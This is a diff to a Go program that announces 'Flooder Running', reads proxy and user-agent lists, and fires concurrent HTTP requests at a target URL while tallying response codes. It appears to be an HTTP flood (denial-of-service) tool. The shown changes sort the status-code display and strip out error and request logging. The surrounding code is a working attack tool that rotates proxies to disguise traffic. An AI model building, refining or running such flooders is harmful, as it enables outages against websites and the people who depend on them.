@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
@@ -64,6 +65,8 @@ func main() {
 		fmt.Sprintf("Method: %s / %s", mode, method),
 	}
 	printBox(boxContent)
+
+	fmt.Printf("\n%s[INFO] Flooder Running%s\n", green, reset)
 
 	var requests []RequestInfo
 	// 读取代理和用户代理信息
@@ -122,11 +125,21 @@ func main() {
 				return
 			default:
 				mu.Lock()
-				fmt.Printf("\r%s[Status] - {", yellow)
-				for code, count := range statusCode {
-					fmt.Printf("%d - %d ", code, count)
+
+				// 收集并排序状态码
+				var codes []int
+				for code := range statusCode {
+					codes = append(codes, code)
 				}
-				fmt.Printf("}  Total: %d%s", successCount, reset)
+				sort.Ints(codes)
+
+				// 打印排序后的状态码和数量
+				fmt.Printf("\r%s[Status] - {", yellow)
+				for _, code := range codes {
+					fmt.Printf("%d - %d ", code, statusCode[code])
+				}
+				fmt.Printf("}%s", reset)
+
 				mu.Unlock()
 				time.Sleep(1 * time.Second)
 			}
@@ -134,7 +147,6 @@ func main() {
 	}()
 
 	wg.Wait()
-	fmt.Println("\nDone.")
 }
 
 func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
@@ -161,7 +173,6 @@ func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
 	// 创建请求
 	req, err := http.NewRequest(method, targetURL, nil)
 	if err != nil {
-		log.Error().Err(err).Msg("failed to create request")
 		return
 	}
 	req.Header.Set("User-Agent", info.UA)
@@ -172,7 +183,6 @@ func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
 	// 执行请求
 	resp, err := client.Do(req)
 	if err != nil {
-		log.Warn().Err(err).Str("proxy", info.Proxy).Msg("request failed")
 		return
 	}
 	defer resp.Body.Close()
@@ -182,8 +192,6 @@ func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
 	successCount++
 	statusCode[resp.StatusCode]++
 	mu.Unlock()
-
-	log.Info().Int("status", resp.StatusCode).Str("method", method).Str("url", targetURL).Msg("request complete")
 }
 
 func readLines(path string) []string {
